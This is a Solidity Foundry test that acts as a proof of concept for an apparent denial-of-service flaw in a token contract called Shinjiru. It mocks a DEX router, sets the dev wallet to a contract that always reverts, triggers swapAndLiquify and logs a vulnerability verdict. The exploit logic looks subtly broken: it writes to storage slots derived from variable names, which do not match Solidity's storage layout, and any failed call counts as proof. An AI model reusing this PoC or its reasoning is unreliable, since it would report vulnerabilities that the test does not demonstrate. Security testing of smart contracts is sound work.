// SPDX-License-Identifier: MIT
pragma solidity 0.8.10;
pragma experimental ABIEncoderV2;

import "forge-std/Test.sol";
import "../src/Shinjiru.sol";

contract RevertFallback {
    fallback() external payable {
        require(false, "Transfer reverted deliberately");
    }
}

contract ShinjiruTest is Test {
    Shinjiru token;
    RevertFallback failContract;
    address owner = 0x1ae66a7070BFABc33715A494B4F59aE1E82E3072;

    function setUp() public {
        // Setup mock router at hardcoded address
        address routerAddress = 0x10ED43C718714eb63d5aA57B78B54704E256024E;
        vm.etch(routerAddress, new bytes(1)); // Minimal contract code
        
        // Setup mock factory
        address factoryAddress = address(456789);
        vm.etch(factoryAddress, new bytes(1));
        
        // Setup mock returns
        vm.mockCall(
            routerAddress,
            abi.encodeWithSelector(bytes4(keccak256("factory()"))),
            abi.encode(factoryAddress)
        );
        
        vm.mockCall(
            routerAddress,
            abi.encodeWithSelector(bytes4(keccak256("WETH()"))),
            abi.encode(address(1))
        );
        
        vm.mockCall(
            factoryAddress,
            abi.encodeWithSelector(bytes4(keccak256("createPair(address,address)"))),
            abi.encode(address(987654))
        );
        
        // Deploy token and configure environment
        vm.startPrank(owner);
        token = new Shinjiru();
        
        // Set wallet to failing contract
        bytes32 devWalletSlot = keccak256(abi.encode("Wallet_Dev"));
        failContract = new RevertFallback();
        vm.store(address(token), devWalletSlot, bytes32(uint256(uint160(address(failContract)))));
        
        // Fund token contract with ETH
        vm.deal(address(token), 1 ether);
        vm.stopPrank();
    }

    function testSendToWalletRevertsOnFailure() public {
        vm.startPrank(owner);
        
        uint256 contractTokenBalance = 1_000_000 * 10**token.decimals();
        bytes32 inSwapSlot = keccak256(abi.encode("inSwapAndLiquify"));
        vm.store(address(token), inSwapSlot, bytes32(uint256(0))); // Set inSwap=false

        console.log("--- BEFORE-Trigger ---");
        uint256 tokenETHBefore = address(token).balance;
        uint256 failContractETHBefore = address(failContract).balance;
        console.log("Token ETH Balance:", tokenETHBefore);
        console.log("Failing Contract ETH Balance:", failContractETHBefore);
        
        console.log("--- Trigger swapAndLiquify ---");
        (bool success, ) = address(token).call(
            abi.encodeWithSignature("swapAndLiquify(uint256)", contractTokenBalance)
        );
        console.log("Call success? ", success);
        
        console.log("--- AFTER-Trigger ---");
        uint256 tokenETHAfter = address(token).balance;
        uint256 failContractETHAfter = address(failContract).balance;
        console.log("Token ETH Balance:", tokenETHAfter);
        console.log("Failing Contract ETH Balance:", failContractETHAfter);

        bool stateUnchanged = (tokenETHBefore == tokenETHAfter) && 
                                (failContractETHBefore == failContractETHAfter);
        
        if (!success && stateUnchanged) {
            console.log("Verdict: Vulnerability Exists - Attack reverted and ETH balances unchanged");
        } else {
            console.log("Verdict: Vulnerability not Exist - Unexpected behavior detected");
        }
        
        vm.stopPrank();
    }
}